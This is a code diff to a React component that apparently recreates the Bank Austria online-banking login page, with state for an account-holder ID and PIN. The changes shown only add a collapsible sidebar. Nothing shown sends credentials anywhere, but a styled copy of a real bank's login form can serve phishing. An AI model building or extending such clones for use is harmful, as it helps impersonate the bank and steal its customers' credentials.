@@ -43,6 +43,7 @@ const BankAustria = () => {
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
   const [activeLang, setActiveLang] = useState<"de" | "en">("de");
+  const [sidebarOpen, setSidebarOpen] = useState(false);
 
   return (
     <div
@@ -55,6 +56,7 @@ const BankAustria = () => {
         {/* Menu button (part of header now) */}
         <a
           href="#"
+          onClick={(e) => { e.preventDefault(); setSidebarOpen(!sidebarOpen); }}
           className="flex items-center justify-center flex-shrink-0 border-l-[3px] border-transparent hover:border-white transition-colors"
           style={{ width: "80px", height: "80px", backgroundColor: "#1a1a1a", borderBottom: "1px solid rgba(102,102,102,0.16)" }}
         >
@@ -89,18 +91,23 @@ const BankAustria = () => {
 
       {/* Sidebar (below header) */}
       <aside
-        className="fixed left-0 top-[80px] flex flex-col z-50"
-        style={{ width: "80px", backgroundColor: "#333333", height: "calc(100vh - 80px)" }}
+        className="fixed left-0 top-[80px] flex flex-col z-50 overflow-hidden"
+        style={{ width: sidebarOpen ? "300px" : "80px", backgroundColor: "#333333", height: "calc(100vh - 80px)", transition: "width 0.3s ease" }}
       >
         {sidebarItems.map(({ icon, label }) => (
           <a
             key={label}
             href="#"
-            className="flex flex-col items-center justify-center py-3 border-l-[3px] border-transparent hover:border-white hover:bg-[#1a1a1a] transition-colors group"
+            className="flex items-center border-l-[3px] border-transparent hover:border-white hover:bg-[#1a1a1a] transition-colors group"
             style={{ height: "80px", borderBottom: "1px solid rgba(102,102,102,0.16)" }}
           >
-            <img src={icon} alt={label} className="h-6 w-6 object-contain opacity-100" />
-            <span className="text-white text-[10px] text-center mt-1 leading-tight uppercase font-medium transition-colors whitespace-pre-line">
+            <div className="flex items-center justify-center flex-shrink-0" style={{ width: "80px" }}>
+              <img src={icon} alt={label} className="h-6 w-6 object-contain opacity-100" />
+            </div>
+            <span
+              className="text-white text-[11px] font-medium uppercase whitespace-pre-line"
+              style={{ opacity: sidebarOpen ? 1 : 0, transition: "opacity 0.3s ease", width: sidebarOpen ? "220px" : "0px", overflow: "hidden" }}
+            >
               {label}
             </span>
           </a>
@@ -108,7 +115,7 @@ const BankAustria = () => {
       </aside>
 
       {/* Right Content Area */}
-      <div className="flex-1 flex flex-col" style={{ marginLeft: "80px", marginTop: "80px" }}>
+      <div className="flex-1 flex flex-col" style={{ marginLeft: sidebarOpen ? "300px" : "80px", marginTop: "80px", transition: "margin-left 0.3s ease" }}>
 
         {/* Main Content */}
         <main className="flex-1 px-10 pt-14 pb-8" style={{ backgroundColor: "#fff" }}>
